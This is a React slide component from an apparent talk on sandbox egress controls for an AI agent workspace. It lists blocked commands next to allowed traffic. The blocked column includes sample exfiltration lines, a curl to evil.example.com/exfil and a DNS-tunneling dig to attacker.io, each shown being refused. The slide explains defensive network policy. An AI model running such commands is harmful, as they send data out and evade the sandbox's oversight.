export default function Slide19WhatGetsBlocked() {
  return (
    <div className="slide" style={{ display: 'flex', flexDirection: 'column' }}>
      <h2>🚦 What Gets Blocked — and What Doesn't</h2>
      <div className="grid two-up" style={{ flex: 1 }}>
        <div>
          <p className="terminal-label" style={{ color: 'var(--bad)' }}>Blocked</p>
          <pre><code className="language-text" style={{ fontSize: '1.08em', lineHeight: 1.52 }}>{`# Arbitrary outbound HTTP
$ curl https://evil.example.com/exfil
→ 403 Forbidden (not in allowlist)

# DNS tunneling
$ dig secret.attacker.io
→ REFUSED (CoreDNS: not allowlisted)

# DNS over TLS
$ kdig @1.1.1.1 +tls example.com
→ connection rejected (port 853 blocked)

# Raw git push (no credentials)
$ git push origin main
→ Permission denied (no key in workspace)

# QUIC / HTTP3
→ connection refused (UDP 443 blocked)`}</code></pre>
        </div>
        <div>
          <p className="terminal-label" style={{ color: 'var(--good)' }}>Allowed</p>
          <pre><code className="language-text" style={{ fontSize: '1.08em', lineHeight: 1.52 }}>{`# OpenRouter (model access via proxy)
$ curl http://127.0.0.1:4000/v1/chat/...
→ 200 OK

# npm install
$ npm install lodash
→ Works (npmjs.com allowlisted)

# Perplexity search (via MCP)
→ Works (api.perplexity.ai allowlisted)

# GitHub source fetch (via git-broker)
→ Works (broker holds deploy key)

# GitHub metadata
→ Works (github.com allowlisted)

# Package managers: pip, cargo, go
→ Work (registries in allowlist)`}</code></pre>
        </div>
      </div>
    </div>
  )
}
